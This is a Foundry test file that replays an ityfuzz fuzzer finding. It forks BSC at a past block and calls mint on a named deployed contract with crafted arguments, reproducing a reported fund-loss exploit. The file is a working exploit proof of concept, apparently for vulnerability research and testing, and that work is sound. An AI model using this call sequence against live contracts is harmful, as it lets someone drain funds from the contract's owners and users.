// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x68Cc90351a79A4c10078FE021bE430b7a12aaA09,0x88503F48e437a377f1aC2892cBB3a5b09949faDd,0xc342774492b54ce5F8ac662113ED702Fc1b34972,0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c -c bsc --onchain-block-number 22315679 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Description ================
[Fund Loss]: Anyone can earn 0.101 ETH by interacting with the provided contracts

================ Trace ================
[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   └─[1] 0xc342774492b54ce5F8ac662113ED702Fc1b34972.mint(19807040628.5660 ether, 0x7ffff1c48fe2f1f892cb, 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, (), (), ())


 */

contract C68Cc is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 22315679);
    }

    function test() public {
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        bytes32[] memory arr0 = new bytes32[](0);
        bytes32[] memory arr1 = new bytes32[](0);
        uint8[] memory arr2 = new uint8[](0);
        I(0xc342774492b54ce5F8ac662113ED702Fc1b34972).mint(19807040628.5660 ether, "��ď�����", 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, arr0, arr1, arr2);
    }

}

interface I {
    function mint(uint256,string memory,address,bytes32[] memory,bytes32[] memory,uint8[] memory) external payable;
}
